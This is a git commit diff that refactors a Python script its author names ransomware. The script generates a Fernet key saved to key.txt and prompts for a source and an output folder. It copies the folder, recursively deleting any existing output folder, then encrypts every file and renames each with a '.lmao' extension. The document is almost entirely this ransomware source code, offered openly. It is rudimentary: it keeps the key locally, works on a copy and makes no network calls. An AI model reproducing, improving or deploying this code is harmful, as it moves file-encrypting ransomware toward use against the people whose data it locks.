4d6a995afa94f46324acb6b7e694454fa02f84f3
leothewhite <leothewhite091021@gmail.com>
2024-06-02 13:16:51 +0900

    refactor ransomware

--- ransomware/ransomware.py
+++ ransomware/ransomware.py
@@ -3,13 +3,9 @@ import shutil
 from cryptography.fernet import Fernet
 
 
-def create_key():
+if not os.path.exists('./key.txt'):
     with open('./key.txt', 'wb') as key_file:
         key_file.write(Fernet.generate_key())
-
-
-if not os.path.exists('./key.txt'):
-    create_key()
 
 with open('./key.txt', 'rb') as key_file:
     key = key_file.read()
@@ -17,15 +13,6 @@ with open('./key.txt', 'rb') as key_file:
 f = Fernet(key)
 
 
-path_to_target = input("enter the path to folder you want to encrypt: ")
-
-if path_to_target[-1] != '/':
-    path_to_target += '/'
-
-path_to_encrypted = input("enter the path to folder you want to save encrypted files: ")
-
-if path_to_encrypted[-1] != '/':
-    path_to_encrypted += '/'
 
 
 # recursive function to delete file including directories
@@ -43,14 +30,6 @@ def delete_directories(now_path):
             print("deleted: "+now_path+object)
 
 
-# copy original folder to encrpyted folder
-try:
-    shutil.copytree(path_to_target, path_to_encrypted)
-except:
-    # delete directory if it already exists
-    delete_directories(path_to_encrypted)
-    os.rmdir(path_to_encrypted)
-    shutil.copytree(path_to_target, path_to_encrypted)
 
 # file encrypting fucnction
 def encrypt(original_path, encrypt_path):
@@ -65,18 +44,36 @@ def encrypt(original_path, encrypt_path):
     os.rename(encrypt_path, encrypt_path+'.lmao')
 
 # searching for the file to encrypt
-def encrypt_files(now_path):
-    targets = os.listdir(path_to_target+now_path)
+def encrypt_files(original_path, encrypted_path, now_path):
+    targets = os.listdir(original_path+now_path)
 
     for target in targets:
-        if os.path.isdir(path_to_target+now_path+target):
-            encrypt_files(now_path+target+'/')
+        if os.path.isdir(original_path+now_path+target):
+            encrypt_files(original_path, encrypted_path, now_path+target+'/')
         else:
-            encrypt(path_to_target+now_path+target, path_to_encrypted+now_path+target)
+            encrypt(original_path+now_path+target, encrypted_path+now_path+target)
 
+path_to_target = input("enter the path to folder you want to encrypt: ")
+
+if path_to_target[-1] != '/':
+    path_to_target += '/'
+
+path_to_encrypted = input("enter the path to folder you want to save encrypted files: ")
+
+if path_to_encrypted[-1] != '/':
+    path_to_encrypted += '/'
+
+# copy original folder to encrpyted folder
+try:
+    shutil.copytree(path_to_target, path_to_encrypted)
+except:
+    # delete directory if it already exists
+    delete_directories(path_to_encrypted)
+    os.rmdir(path_to_encrypted)
+    shutil.copytree(path_to_target, path_to_encrypted)
 
 
 target_files = os.listdir(path_to_target)
 
 for target in target_files:
-    encrypt_files('')
+    encrypt_files(path_to_target, path_to_encrypted, '')
